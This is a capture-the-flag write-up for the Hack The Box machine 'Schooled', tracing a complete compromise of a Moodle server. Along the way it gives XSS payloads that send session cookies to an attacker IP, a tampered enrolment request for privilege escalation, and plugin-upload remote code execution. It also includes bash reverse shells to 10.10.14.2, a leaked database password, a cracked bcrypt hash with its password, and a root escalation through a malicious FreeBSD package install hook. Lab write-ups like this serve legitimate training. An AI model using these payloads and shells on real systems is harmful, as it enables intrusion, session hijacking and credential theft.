## Schooled

https://app.hackthebox.com/machines/Schooled

<br>

### Manoel Access

Open 10.10.10.234:22  
Open 10.10.10.234:80  
Open 10.10.10.234:33060

Subdomain enumeration founds moodle.schooled.htb.
```
wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://schooled.htb' -H "Host: FUZZ.schooled.htb" --hw 1555
```

Based on [Moodle Github](https://github.com/moodle/moodle), we find moodle's version 3.9 at `/moodle/theme/upgrade.txt`.

We can perform XSS to steal cookies as [this github](https://github.com/HoangKien1020/CVE-2020-25627) shows.
```
<script>var i=new Image;i.src="http://10.10.14.2/xss.php?"+document.cookie;</script>

OR

var fetch_req = new XMLHttpRequest();
fetch_req.open("GET", "http://10.10.14.2/?cookie=" + document.cookie, false);          
fetch_req.send();
```

<br>

### Lianne Access
There is another CVE that we can use to privesc from teacher into manager.

First, we need to know someone that has manager role. On Lianne Carter page, we see "Manager & English Lecturer", so we can try her.

Go to Math class --> Participants --> Enrol Users and enter Lianne and Enroll users. The request will be:
```
GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid=10&sesskey=CIXNWKLP05&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0&userlist%5B%5D=25&roletoassign=5&startdate=4&duration=
```

We want to change `userlist%5B%5D=25` to Manuel's id that we can find that is 24 on his profile page and change `roletoassign` from 5 to 1 (manager). Save this two requests since a reset is removing lianne and our manager permission every minute.

Now a button with "Log in as" appears on Lianne's profile. We can impersonate her user.

<br>

#### Enable Permissions
In the same github link, we can enable full permission for our user with the payload indicated there editing role 'Manager' on site administration.

<br>

#### RCE
We can follow [this github](https://github.com/HoangKien1020/Moodle_RCE/blob/master/README.md) to achieve RCE.

Upload plugin from zip file at Site administration and get RCE.

```
curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id
```

I've automated most of the steps in exploit.py, you just need to put the user cookie hardcoded in the file.

<br>

#### Better Shell
```
curl -G --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.2/1337 0>&1'" http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php

/usr/local/bin/python3 -c 'import pty;pty.spawn("bash")'
```

### Jamie User
We find DB password at /usr/local/www/apache24/data/moodle/config.php.
```
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
```

Connect on the database and find hashes.
```
/usr/local/bin/mysql -u moodle -pPlaybookMaster2020 moodle
```

There are a lot of bcrypt hashes, but the most interesting is from admin username.
```
admin | jamie@staff.schooled.htb
$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
```

Crack it and find Jamie's password:!QAZ2wsx
```
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
```

<br>

### Root User
```
(ALL) NOPASSWD: /usr/sbin/pkg update
(ALL) NOPASSWD: /usr/sbin/pkg install *
```

```
echo '/tmp/shell.sh' > x.sh
fpm -n x -s dir -t freebsd -a all --before-install ./x.sh  .


/tmp/shell.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.2/9001 0>&1


sudo pkg install -y --no-repo-update ./x-1.0.txz
```
